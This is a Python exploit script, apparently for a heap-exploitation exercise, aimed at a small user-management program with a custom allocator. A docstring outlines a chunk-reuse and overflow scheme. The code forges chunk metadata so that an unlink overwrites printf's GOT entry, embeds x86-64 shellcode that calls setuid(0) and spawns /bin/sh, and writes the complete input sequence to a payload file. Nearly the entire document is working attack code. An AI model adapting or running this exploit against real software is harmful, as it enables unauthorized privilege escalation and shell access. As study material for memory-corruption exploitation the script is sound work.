"""
Exploit scheme :
	Create user 1 : Chunk 1, 2 created
	Create user 2 : Chunk 3, 4 created
	Delete user 1 : Chunk 1, 2 freed <-- Next user will be created there
	Create user 3 = 1' : Chunk 1', 2' created with (1' ; 2') is malloc'd at the same place as (1 ; 2)
	---> Overflow the password of user 3 = 1' to change metadata of chunks 3, 4
	Delete user 2 : Chunks 3, 4 will be freed
	Program exploited 

	Exploit payload : Overwrite GOT of printf to execute shellcode
"""
import struct

CHUNK_METADATA_SIZE = 40
BUFFER_SIZE = 512

#WHERE = 0x405060

# CONSTANTS, may vary with the machine

PRINTF_GOT = 0x405038
CHUNK1_METADATA_START = 0x427490

# Where to write with unlink and what to write
WHERE = PRINTF_GOT # printf@GOT.plt
WHAT = CHUNK1_METADATA_START+CHUNK_METADATA_SIZE+5 # 0x4274bd : Place of of the intermediate shellcode, in chunk1 data, after the "AAAA"'s 
WHAT_ELSE = WHAT+100 # Place of the shellcode, 100 bytes after the intermediate shellcode
BK_OFF = 32
FD_OFF = 24

"""
shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf"
shellcode += b"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
shellcode += b"\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
"""
shellcode = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
shellcode += b"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
shellcode += b"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
shellcode += b"\x58\x0f\x05"
"""
Obtained with https://defuse.ca/online-x86-assembler.htm
Assembler code is :
mov rax, <WHAT+100>
jmp rax
"""
intermediate_shellcode = b"\x48\xC7\xC0\x21\x75\x42\x00\xFF\xE0"

instructions = []

def append_instruction(instruction):
	instructions.append(instruction+b"\n")

def create_user(username, password):
	append_instruction(b"1")
	append_instruction(username)
	append_instruction(password)

def login_user(id, password):
	append_instruction(b"2")
	append_instruction(id)
	append_instruction(password)

def delete_user():
	append_instruction(b"3")

def show_users():
	append_instruction(b"4")

def disconnect():
	append_instruction(b"5")

def exit_program():
	append_instruction(b"0")

create_user(b"test", b"12")
create_user(b"test2", b"123")
login_user(b"0", b"12")
delete_user()

# Old userlist freed chunk metadata and data, metadata is leaved unchanged, unless used=1, data is overwrote with null bytes
# metadata
intermediate_chunk_metadata = struct.pack("Q", 64) # size
intermediate_chunk_metadata += struct.pack("Q", BUFFER_SIZE + CHUNK_METADATA_SIZE) # prev_size
intermediate_chunk_metadata += b"\x03" + b"\x00"*7 # used = 1 ; prev_used = 1
intermediate_chunk_metadata += struct.pack("Q", 0) # fd
intermediate_chunk_metadata += struct.pack("Q", 0) # fd # bk, last byte has to be null byte
# data
intermediate_chunk_data = b"\x00"*24

# username
chunk1_chunk_metadata = struct.pack("Q", 552) # size
chunk1_chunk_metadata += struct.pack("Q", 0) # prev_size
chunk1_chunk_metadata += b"\x01" + b"\x00"*7 # used = 1 ; prev_used = 1
chunk1_chunk_metadata += struct.pack("Q", 0) # fd
chunk1_chunk_metadata += struct.pack("Q", 0) # fd # bk, last byte has to be null byte

# data
chunk1_chunk_data = b"AAAA\x00"
chunk1_chunk_data += intermediate_shellcode # mov rax WHAT_ELSE ; jmp rax : Jumping to shellcode
chunk1_chunk_data += b"\x90"*100
chunk1_chunk_data += shellcode # shell execution
chunk1_chunk_data += b"\x90"*(512 - len(chunk1_chunk_data))

# username
chunk2_chunk_metadata = struct.pack("Q", 552) # size
chunk2_chunk_metadata += struct.pack("Q", 0) # prev_size
chunk2_chunk_metadata += b"\x02" + b"\x00"*7 # used = 0 ; prev_used = 1
chunk2_chunk_metadata += struct.pack("Q", WHERE - BK_OFF) # fd
chunk2_chunk_metadata += struct.pack("Q", WHAT) # # bk, last byte has to be null byte
# data
chunk2_chunk_data = b"BBBB"+b"\x00"*(512-4-1)

# password payload
password_pay = b"A"*512
password_pay += intermediate_chunk_metadata
password_pay += intermediate_chunk_data
password_pay += chunk1_chunk_metadata
password_pay += chunk1_chunk_data
password_pay += chunk2_chunk_metadata
password_pay += chunk2_chunk_data

create_user(b"test", password_pay)
show_users()
login_user(b"1", b"BBBB")
delete_user()

payload = b""
for i in instructions:
	payload += i

file = open("payload", "wb")
file.write(payload)
file.close()

